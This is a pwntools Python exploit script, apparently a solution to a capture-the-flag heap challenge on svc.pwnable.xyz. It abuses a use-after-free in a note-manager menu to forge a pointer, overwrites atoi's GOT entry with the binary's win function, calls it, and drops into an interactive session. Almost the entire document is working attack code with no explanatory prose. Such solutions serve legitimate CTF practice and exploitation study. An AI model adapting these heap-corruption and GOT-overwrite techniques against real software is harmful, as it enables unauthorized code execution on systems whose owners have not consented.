from pwn import *

def Create(count):
    p.sendlineafter("> ",str(1))
    p.sendlineafter(": ",str(count))

def Select(index):
    p.sendlineafter("> ",str(2))
    p.sendlineafter(": ",str(index))

def Edit(index,content):
    Select(index)
    p.sendlineafter("> ",str(3))
    p.sendlineafter(": ",str(content))

def Delete(index):
    Select(index)
    p.sendlineafter("> ",str(4))

#context.log_level = 'debug'
#p = process('./challenge',env = { 'LD_PRELOAD' : 'libc.so' })
p = remote('svc.pwnable.xyz',30046)
elf = ELF('challenge')


current_note = 0x6022A0 #value below the first node, control with count of allocations

Create(0x71)
Delete(0x70)

Edit(0x70, p64(current_note - 8)) #use after free

Select(0x71)
Create(2) #last is forget at (current_note  +8)

Edit(0x72, p64(0)*5 + p64(elf.symbols.got.atoi)) #rewrite the first node + 16 pointer to data
log.info(hex(elf.symbols.got.atoi))


Edit(0, p64(elf.symbols.win)) #rewrite the atoi address in got
Select(1) # call atoi


p.interactive()
